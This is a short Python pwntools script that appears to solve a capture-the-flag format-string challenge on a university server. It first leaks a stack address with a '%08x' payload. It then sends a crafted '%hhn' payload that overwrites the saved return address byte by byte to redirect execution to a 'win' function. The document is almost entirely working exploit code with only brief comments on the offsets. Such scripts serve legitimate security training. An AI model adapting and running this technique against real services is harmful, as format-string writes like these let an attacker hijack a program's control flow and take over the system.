from pwn import *

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22198)

payload = b'%08x'

s.sendline(payload)
print(s.recvline())
s.close()

s = remote("mustard.stt.rnl.tecnico.ulisboa.pt", 22198)

# buffer_addr       = 0xffffdc6c (from the payload above)
# &eip - &buffer    = 0x90 = 144 (obtained locally with gdb)
# 0xffffdc6c + 0x90 = 0xffffdcfc

saved_eip = 0xffffdcfc
#win      = 0x080484e6 

payload =  p32(saved_eip+2) + b'%007$hhn'                        
payload += p32(saved_eip+3) + b'%010$hhn'                   
payload += p32(saved_eip+1) + b'%000120c' + b'%013$hhn'     
payload += p32(saved_eip+0) + b'%000094c' + b'%018$hhn'     

s.sendline(payload)
print(s.recvline())

s.close()